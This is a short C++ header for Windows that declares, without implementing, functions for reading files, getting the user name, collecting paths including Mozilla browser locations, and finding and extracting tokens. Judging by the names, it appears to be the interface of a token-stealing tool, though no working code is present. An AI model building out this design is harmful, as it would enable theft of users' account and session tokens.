#pragma once
#include <regex>
#include <iostream>
#include <fstream>
#include <string>
#include <Windows.h>

namespace regex
{
	std::vector<std::string> resplit(const std::string s, const std::string reg_str);
	std::vector<std::string> find_token(std ::string path);
}

namespace path
{
	std::string read_file(std::string path);
	std::string pog_mozilla(std::string path);
	std::string getusername();
	std::vector<std::string> get_paths();
	std::vector<std::string> extract_tokens(std ::vector<std ::string> file_paths);
}